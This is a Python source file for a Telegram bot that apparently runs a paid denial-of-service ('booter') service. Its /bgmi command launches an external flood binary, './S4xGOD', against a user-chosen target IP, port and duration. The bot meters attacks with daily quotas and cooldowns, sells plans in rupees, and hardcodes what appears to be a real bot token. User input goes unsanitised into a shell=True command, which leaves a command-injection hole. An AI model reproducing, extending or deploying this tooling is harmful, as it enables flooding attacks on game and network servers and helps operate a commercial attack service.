aimport telebot
import subprocess
import datetime
import time
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot initialization
BOT_TOKEN = "7926504208:AAEw4m3q-7AQzAyDuUAkU62wVCsDIBcpUf4"  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin IDs
admin_id = ["6769245930"]  # Replace with your Telegram user ID

# File paths
USER_FILE = "users.txt"

# Constants
default_max_daily_attacks = 5  # Default maximum allowed attacks per user per day
default_cooldown_time = 240  # Default cooldown time in seconds

# Variables
allowed_user_ids = []
user_attack_count = {}
user_attack_limits = {}  # Track custom attack limits for each user
last_attack_time = {}  # Track the time of the last attack for cooldown
active_attacks = {}  # Track active attack processes for each user

# Load allowed users from file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Save allowed users to file
def save_users():
    with open(USER_FILE, "w") as file:
        file.write("\n".join(allowed_user_ids))

# Command: /bgmi (Attack command with cooldown)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        max_attacks = user_attack_limits.get(user_id, default_max_daily_attacks)

        current_time = datetime.datetime.now()
        last_time = last_attack_time.get(user_id, None)

        # Check cooldown
        if last_time:
            time_diff = (current_time - last_time).total_seconds()
            if time_diff < default_cooldown_time:
                remaining_time = default_cooldown_time - time_diff
                bot.reply_to(message, f"𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 🚫❌\n.    👉 {int(remaining_time)} 👈\n𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙧𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜")
                return

        # Check daily attack limit
        attacks_today = user_attack_count.get(user_id, 0)
        if attacks_today >= max_attacks:
            bot.reply_to(message, f"𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝙍𝙚𝙖𝙘𝙝𝙚𝙙 𝙈𝙖𝙭𝙞𝙢𝙪𝙢  𝘼𝙩𝙩𝙖𝙘𝙠𝙨 ({max_attacks}) \n𝐏𝐋𝐄𝐀𝐒𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐀𝐆𝐀𝐈𝐍 𝐓𝐎𝐌𝐎𝐑𝐑𝐎𝐖 && 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 𝐓𝐎 𝐑𝐄𝐒𝐄𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒 𝘾𝙍𝙀𝘿𝙄𝙏𝙎")
            return

        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "𝙽𝙾𝚆 𝙱𝙾𝚃 𝚂𝚃𝙰𝚃𝚄𝚂 --> 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴✅ \n𝚈𝙾𝚄 𝙲𝙰𝙽 𝚄𝚂𝙴 𝚃𝙷𝙸𝚂 𝙱𝙾𝚃 𝙻𝙸𝙺𝙴 --> \n\n/𝚋𝚐𝚖𝚒 <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎>")
            return

        target, port, duration = command[1], int(command[2]), int(command[3])
        if duration > 240:
            bot.reply_to(message, "𝐓𝐘𝐏𝐄 𝐒𝐄𝐂𝐎𝐍𝐃 --> 240")
            return

        user_attack_count[user_id] = attacks_today + 1
        last_attack_time[user_id] = current_time

        # Create a "Stop Attack" button
        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("Stop Attack", callback_data=f"stop:{user_id}")
        markup.add(stop_button)

        # Send attack start message with the "Stop Attack" button
        bot.reply_to(message, f"𝆺𝅥⃝Oғͥғɪᴄͣɪͫ͢͢͢ᴀℓ —͟͞͞Ꮅ𝙧ɇ𝙢īū𝙢—͟͞͞\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗\n\n▁ ▂ ▄ ▅ ▆ ▇ █\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {duration} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖊𝖑═══", reply_markup=markup)

        # Running the attack in a thread to avoid blocking the bot
        def execute_attack(user_id, target, port, duration):
            process = subprocess.Popen(f"./S4xGOD {target} {port} {duration} 1000", shell=True)
            active_attacks[user_id] = process

            # Wait for the process to complete or for the duration to pass
            start_time = time.time()
            while time.time() - start_time < duration:
                if process.poll() is not None:  # Check if the process has finished early
                    break
                time.sleep(1)  # Check every second to avoid busy-waiting

            # Terminate the attack after the duration or if the process finishes
            process.terminate()
            active_attacks.pop(user_id, None)  # Remove the process from active attacks

            # Calculate remaining attacks for the user
            attacks_today = user_attack_count.get(user_id, 0)
            remaining_attacks = max_attacks - attacks_today

            # Send a message to the user that the attack was stopped automatically
            bot.send_message(user_id, f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 - 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 ✅\n𝐓𝐚𝐫𝐠𝐞𝐭 {target} 𝐏𝐨𝐫𝐭 {port} 𝐓𝐢𝐦𝐞 {duration}\n\n𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞 {remaining_attacks}\n═𝗕𝗚𝗠𝗜 𝗡𝗜𝗚𝗛𝗧 𝗚𝗢𝗗═"
            )

        Thread(target=execute_attack, args=(user_id, target, port, duration)).start()
    else:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐛𝐲 𝐚𝐝𝐦𝐢𝐧 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐮𝐬")

# Callback handler for stopping the attack
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop:"))
def stop_attack_callback(call):
    user_id = call.data.split(":")[1]  # Extract the user ID from callback data

    if call.from_user.id == int(user_id):  # Ensure the callback is from the attack initiator
        if user_id in active_attacks:
            process = active_attacks[user_id]
            process.terminate()  # Stop the attack process
            active_attacks.pop(user_id, None)  # Remove the process from the active attacks
            bot.edit_message_text("𝗬𝗢𝗨𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣", chat_id=call.message.chat.id, message_id=call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "𝗡𝗢 𝗔𝗡𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗢𝗨𝗡𝗗")
    else:
        bot.answer_callback_query(call.id, "ʏᴏᴜ ᴄᴀɴ ɴᴏᴛ ꜱᴛᴏᴘ ᴀɴᴏᴛʜᴇʀ ᴜꜱᴇʀ ᴀᴛᴛᴀᴄᴋ")

@bot.message_handler(commands=['plan'])
def show_plan(message):
    plan_text = (
        "𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗣𝗹𝗮𝗻𝘀✅:\n\n"
        "1️⃣ 𝟭 𝗗𝗮𝘆 𝗣𝗹𝗮𝗻: 𝟭𝟬𝟬 𝗥𝗨𝗣𝗘𝗘𝗦\n"
        "2️⃣ 𝟮 𝗗𝗮𝘆 𝗣𝗹𝗮𝗻: 𝟭𝟴𝟬 𝗥𝗨𝗣𝗘𝗘𝗦\n"
        "3️⃣ 𝟯 𝗗𝗮𝘆 𝗣𝗹𝗮𝗻: 𝟯𝟬𝟬 𝗥𝗨𝗣𝗘𝗘𝗦\n"
        "\nᴄʜᴏᴏꜱᴇ ᴀ ᴘʟᴀɴ ᴛᴏ ᴜᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ꜰᴏʀ ᴍᴏʀᴇ ᴀᴛᴛᴀᴄᴋꜱ"
    )
    bot.reply_to(message, plan_text)
    
# Command: /adduser (Add a user)
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)

    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) != 2:
            bot.reply_to(message, "𝙼𝙰𝙳𝙴 ❎ 𝙽𝙾 𝙿𝙰𝚁𝙰 𝙳𝙾 𝙿𝙾𝚂𝚂𝙸𝚅𝙴 𝘾𝙾𝙼𝙼𝙰𝙽𝙳 Ꭿ•")
            return

        new_user_id = command[1]
        if new_user_id not in allowed_user_ids:
            allowed_user_ids.append(new_user_id)
            save_users()
            bot.reply_to(message, f"𝘼𝘿𝘿𝙀𝘿 ✅ {new_user_id} ")
        else:
            bot.reply_to(message, f"{new_user_id} 𝙀𝙓𝙄𝙎𝙏𝙄𝙉𝙂")
    else:
        bot.reply_to(message, "𝘼𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙖𝙩𝙞𝙤𝙣 𝙛𝙖𝙞𝙡𝙚𝙙...")

# Command: /remove (Remove a user)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) != 2:
            bot.reply_to(message, "𝙼𝙰𝙳𝙴 ❎")
            return

        target_user_id = command[1]
        if target_user_id in allowed_user_ids:
            allowed_user_ids.remove(target_user_id)
            save_users()
            bot.reply_to(message, f" 𝙵𝙾𝙸𝙻𝙴𝘿")
        else:
            bot.reply_to(message, f"𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿")

# Command: /setattacks (Set remaining attacks)
@bot.message_handler(commands=['setattacks'])
def set_attacks(message):
    user_id = str(message.chat.id)

    if str(message.chat.id) in admin_id:
        command = message.text.split()
        if len(command) != 3:
            bot.reply_to(message, " Use ✅ /setattacks <user_id> <remaining_attacks>")
            return

        target_user_id = command[1]
        remaining_attacks = int(command[2])

        user_attack_limits[target_user_id] = remaining_attacks
        bot.reply_to(message, f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙍𝙀𝙎𝙀𝙏 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 ✅")

@bot.message_handler(commands=['check'])
def check_status(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        attacks_today = user_attack_count.get(user_id, 0)
        max_attacks = user_attack_limits.get(user_id, default_max_daily_attacks)
        remaining_attacks = max_attacks - attacks_today
        last_time = last_attack_time.get(user_id, None)

        if last_time:
            time_diff = (datetime.datetime.now() - last_time).total_seconds()
            remaining_time = max(0, default_cooldown_time - time_diff)
            status_message = (
                f"𝐔𝐬𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬:\n"
                f"𝑨𝑻𝑻𝑨𝑪𝑲𝑺 𝑻𝑶𝑫𝑨𝒀: {attacks_today}/{max_attacks}\n"
                f"𝑹𝑬𝑴𝑨𝑰𝑵𝑰𝑵𝑮 𝑨𝑻𝑻𝑨𝑪𝑲𝑺: {remaining_attacks}\n"
                f"𝑪𝑶𝑶𝑳𝑫𝑶𝚆𝑵: {int(remaining_time)} 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂"
            )
        else:
            status_message = (
                f"𝐔𝐬𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬:\n"
                f"𝑨𝑻𝑻𝑨𝑪𝑲𝑺 𝑻𝑶𝑫𝑨𝒀: {attacks_today}/{max_attacks}\n"
                f"𝑹𝑬𝑴𝑨𝑰𝑵𝑰𝑵𝑮 𝑨𝑻𝑻𝑨𝑪𝑲𝑺: {remaining_attacks}\n"
                f"𝑪𝑶𝑶𝑳𝑫𝑶𝚂: No attack in progress"
            )

        bot.reply_to(message, status_message)
    else:
        bot.reply_to(message, "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐛𝐲 𝐚𝐝𝐦𝐢𝐧 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐮𝐬")
        
# Command: /resetcooldown (Reset cooldown for all users)
@bot.message_handler(commands=['resetcooldown'])
def reset_cooldown(message):
    user_id = str(message.chat.id)

    if str(message.chat.id) in admin_id:
        last_attack_time.clear()
        bot.reply_to(message, "𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗥𝗘𝗦𝗘𝗧 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅")

# Command: /help (Show available commands)
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n\n"
        "/check - my status✅\n"
        "/bgmi <target> <port> <time> - Start an attack\n"
        "/add <user_id> - Add a user (Admin only)\n"
        "/remove <user_id> - Remove a user (Admin only)\n"
        "/setattacks <user_id> <remaining_attacks> - Set remaining attacks for a user (Admin only)\n"
        "/resetcooldown - Reset cooldown for all users (Admin only)\n"
        "/help - Show this help message\n"
        "/plan - buy for personal"
    )
    bot.reply_to(message, help_text)

# Start the bot
bot.polling()
